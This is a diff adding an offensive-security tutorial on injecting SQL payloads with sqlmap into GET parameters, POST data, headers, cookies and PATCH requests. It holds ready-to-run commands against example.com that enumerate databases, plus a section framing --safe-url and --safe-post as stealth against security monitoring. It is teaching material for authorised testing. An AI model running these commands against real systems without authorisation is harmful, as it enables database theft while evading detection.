@@ -1,0 +1,114 @@
+---
+title: Mastering Request Handling & Injection Techniques
+description: Learn to handle and inject SQL payloads in HTTP requests with sqlmap,
+  targeting GET, POST, headers, cookies, and more.
+keywords:
+- SQL injection
+- sqlmap
+- HTTP requests
+- GET parameters
+- POST data
+- header injection
+- cookie injection
+- Burp Suite
+- web security
+---
+
+# Request Handling & Injection
+
+## Context
+
+In this article, we'll delve into the methodology of handling and injecting SQL payloads into various HTTP request components using `sqlmap`. Understanding HTTP methods, headers, cookies, and web request structures are essential prerequisites. Additionally, familiarity with sqlmap usage and basic boolean injection discovery strategies will be beneficial.
+
+## Theory
+
+### Request Handling in SQL Injection
+
+SQL injection vulnerabilities can be exploited by manipulating unsanitized inputs within HTTP requests to execute arbitrary SQL queries against a backend database. It's crucial to understand which parts of an HTTP request can be targeted for SQL injection, including URL query parameters, POST data, headers, and cookies.
+
+### SQLMap Request Options
+
+`sqlmap` is a powerful tool for automating SQL injection testing. By using specific options, such as `-r`, `--data`, `--headers`, and `--cookie`, users can specify exactly which components of an HTTP request sqlmap should target. This precision allows for more effective testing and exploitation.
+
+### Burp Suite Request Integration
+
+Burp Suite can be used to capture and export HTTP requests which can then be imported into `sqlmap`. This feature is advantageous for replaying complex HTTP requests that are difficult to manually replicate in sqlmap. The typical workflow involves capturing a request in Burp Suite, saving it to a file, and using the `-r` option in sqlmap to load it.
+
+### Injection Vectors in HTTP Requests
+
+The components of an HTTP request that can be targeted for SQL injection include:
+
+- **GET parameters**: Query strings attached to URLs.
+- **POST data**: Payload sent with POST methods, often used in form submissions.
+- **Headers**: HTTP headers such as User-Agent, Referrer, etc.
+- **Cookies**: Key-value pairs used to maintain session state.
+- **PATCH method**: Rarely used method but can be a vector for injection.
+
+## Practice
+
+### GET Injection with sqlmap
+
+Inject SQL payloads into GET parameters to exploit query string inputs.
+
+```bash
+sqlmap -u 'http://example.com/page?id=1' --method=GET --dbs
+```
+
+- This will test the `id` parameter for vulnerabilities by retrieving available databases.
+
+### POST Injection with sqlmap
+
+Target POST data for SQL injection to exploit form submission fields.
+
+```bash
+sqlmap -u 'http://example.com/login' --method=POST --data='username=admin&password=pass' --dbs
+```
+
+- Here, sqlmap will attempt to inject into the `username` and `password` fields and enumerate accessible databases.
+
+### Header Injection with sqlmap
+
+Use SQL payloads on HTTP headers to exploit header-based inputs.
+
+```bash
+sqlmap -u 'http://example.com/page' --headers='User-Agent: sqlmap' --dbs
+```
+
+- By altering headers such as `User-Agent`, sqlmap seeks vulnerabilities that could expose database information.
+
+### Cookie Injection with sqlmap
+
+Inject into HTTP cookies to gain unauthorized access via state-preserving components.
+
+```bash
+sqlmap -u 'http://example.com/page' --cookie='sessionid=abc123' --dbs
+```
+
+- This examines the `sessionid` cookie for possible SQL injection points.
+
+### PATCH Method Injection with sqlmap
+
+Utilize the PATCH HTTP method for SQL injection when using APIs or modifying resources.
+
+```bash
+sqlmap -u 'http://example.com/resource' --method=PATCH --data='{"key":"value"}' --dbs
+```
+
+- Tests the ability to exploit API endpoints that allow partial updates to a resource.
+
+### Safe URL and Safe POST Usage
+
+Employ safe URLs and POST data to stealthily perform SQL injection without alerting security systems.
+
+```bash
+sqlmap -u 'http://example.com/page' --safe-url='http://example.com/safe' --safe-post='param=value' --dbs
+```
+
+- This ensures the session or state is consistent while minimizing detection risk.
+
+## Tools
+
+- **sqlmap**
+- **Burp Suite**
+
+By following these techniques, you will be equipped to efficiently incorporate SQL injection tests into your cybersecurity practice using tools like `sqlmap` and Burp Suite, targeting various segments of HTTP requests.
